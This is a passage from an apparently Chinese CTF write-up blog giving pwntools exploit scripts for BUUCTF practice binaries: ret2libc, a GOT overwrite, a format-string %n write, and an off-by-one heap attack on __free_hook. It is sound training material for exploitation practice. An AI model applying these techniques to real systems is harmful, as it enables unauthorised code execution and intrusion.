string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29781</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>exec_string <span class="token operator">=</span> <span class="token number">0x80485CB</span>string <span class="token operator">=</span> <span class="token number">0x804A060</span>gets <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x6c</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gets<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>exec_string<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>string<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Please input:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其次可以直接用<code>ret2libc</code>来<code>getshell</code></p><p>exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>libc_start_main <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>main <span class="token operator">=</span> <span class="token number">0x80486F8</span>pop_ebp_ret <span class="token operator">=</span> <span class="token number">0x08048680</span>ret <span class="token operator">=</span> <span class="token number">0x080483f2</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x6c</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>libc_start_main<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please input:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc_start_main <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>p1 <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x6c</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span>  p32<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Please input:'</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="picoctf-2018-got-shell"><a href="#picoctf-2018-got-shell" class="headerlink" title="picoctf_2018_got_shell"></a><a href="https://buuoj.cn/challenges#picoctf_2018_got_shell">picoctf_2018_got_shell</a></h2><p>检查保护</p><pre class="line-numbers language-none"><code class="language-none">[*] &#39;&#x2F;home&#x2F;starrysky&#x2F;buuctf&#x2F;picoctf_2018_got_shell&#x2F;pwn&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反汇编查看</p><pre class="line-numbers language-none"><code class="language-none">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  _DWORD *v3; &#x2F;&#x2F; [esp+14h] [ebp-114h] BYREF  int v4; &#x2F;&#x2F; [esp+18h] [ebp-110h] BYREF  char s[256]; &#x2F;&#x2F; [esp+1Ch] [ebp-10Ch] BYREF  unsigned int v6; &#x2F;&#x2F; [esp+11Ch] [ebp-Ch]  v6 &#x3D; __readgsdword(0x14u);  setvbuf(_bss_start, 0, 2, 0);  puts(&quot;I&#39;ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?&quot;);  __isoc99_scanf(&quot;%x&quot;, &amp;v3);  sprintf(s, &quot;Okay, now what value would you like to write to 0x%x&quot;, v3);  puts(s);  __isoc99_scanf(&quot;%x&quot;, &amp;v4);  sprintf(s, &quot;Okay, writing 0x%x to 0x%x&quot;, v4, v3);  puts(s);  *v3 &#x3D; v4;  puts(&quot;Okay, exiting now...\n&quot;);  exit(1);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以直接向一个地址写入内容，还有<code>win</code>函数，直接改返回地址为<code>win</code>函数地址即可<code>getshell</code></p><p>exp如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26366</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">0x804A014</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Okay, now what value would you like to write to"</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">0x804854B</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Okay, exiting now...'</span><span class="token punctuation">,</span> <span class="token string">b'cat flag.txt'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="mrctf2020-easy-equation"><a href="#mrctf2020-easy-equation" class="headerlink" title="mrctf2020_easy_equation"></a><a href="https://buuoj.cn/challenges#mrctf2020_easy_equation">mrctf2020_easy_equation</a></h2><pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s; &#x2F;&#x2F; [rsp+Fh] [rbp-1h] BYREF  memset(&amp;s, 0, 0x400uLL);  fgets(&amp;s, 0x3FF, stdin);  printf(&amp;s);  if ( 11 * judge * judge + 17 * judge * judge * judge * judge - 13 * judge * judge * judge - 7 * judge &#x3D;&#x3D; 198 )    system(&quot;exec &#x2F;bin&#x2F;sh&quot;);  return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>保护只开了堆栈不可执行，看程序简单计算一下<code>judge</code>为<code>2</code>时直接<code>getshell</code>，存在栈上的格式化字符串，直接用<code>%c</code>方法会零截断，但是<code>%n</code>的用法根本上是将<code>%n</code>之前<code>printf</code>已经打印的字符个数赋值给偏移处指针所指向的地址位置，那么只要控制<code>n</code>前字符个数就可以覆盖为一个确定的小数字了</p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28623</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'aa%9$naaa'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x060105C</span><span class="token punctuation">)</span> r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="npuctf-2020-easyheap"><a href="#npuctf-2020-easyheap" class="headerlink" title="npuctf_2020_easyheap"></a><a href="https://buuoj.cn/challenges#npuctf_2020_easyheap">npuctf_2020_easyheap</a></h2><p>一个堆题没开地址随机化的堆题，分析一下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">unsigned __int64 edit()&#123;  unsigned int v1; &#x2F;&#x2F; [rsp+0h] [rbp-10h]  char buf[4]; &#x2F;&#x2F; [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v3; &#x2F;&#x2F; [rsp+8h] [rbp-8h]  v3 &#x3D; __readfsqword(0x28u);  printf(&quot;Index :&quot;);  read(0, buf, 4uLL);  v1 &#x3D; atoi(buf);  if ( v1 &gt;&#x3D; 0xA )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( heaparray[v1] )  &#123;    printf(&quot;Content: &quot;);    read_input(*(_QWORD *)&amp;heaparray[v1]-&gt;addr, heaparray[v1]-&gt;size + 1);&#x2F;&#x2F; vuln    puts(&quot;Done!&quot;);  &#125;  else  &#123;    puts(&quot;How Dare you!&quot;);  &#125;  return __readfsqword(0x28u) ^ v3;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>edit</code>函数中存在一个<code>off-by-one</code>漏洞，程序中存在一个<code>heaparry</code>的堆管理，且在<code>edit</code>和<code>show</code>的时候都是直接将<code>heaparry</code>中指向的地址视为目标堆，因此需要控制堆管理</p><p>先<code>add</code>两个堆，实际创建的是四个堆，其中两个用于堆管理，利用<code>off-by-one</code>改第三个堆大小覆盖掉第四个堆，释放第三个堆之后<code>tcache</code>中存在两个堆，一个是合并之后的一个是第四个堆，此时再创建一个大小为合并之后的堆时它的堆管理就在第四个堆的位置，而第三个堆又能覆写第四个堆，即能够改写堆管理中的大小和地址</p><p>将堆管理中的地址设置成<code>got</code>表中的一个地址再<code>show</code>就能得到<code>libc</code>基址，同理改成<code>__free_hook</code>之后<code>edit</code>就能改<code>__free_hook</code>为<code>system</code></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28422</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size of Heap(0x10 or 0x20 only) : '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> <span class="token string">b'\x41'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x809c0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.27.so'</span><span class="token punctuation">)</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x41'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="mrctf2020-shellcode-revenge"><a href="#mrctf2020-shellcode-revenge" class="headerlink" title="mrctf2020_shellcode_revenge"></a><a href="https://buuoj.cn/challenges#mrctf2020_shellcode_revenge">mrctf2020_shellcode_revenge</a></h2><p>可见字符<code>shellcode</code>，程序中含有可执行段，反编译失败只能看汇编</p><pre class="line-numbers language-none"><code class="language-none">.text:00000000000011B8                               loc_11B8:                               ; CODE XREF: main+EB↓j.text:00000000000011B8 8B 45 FC                      mov     eax, 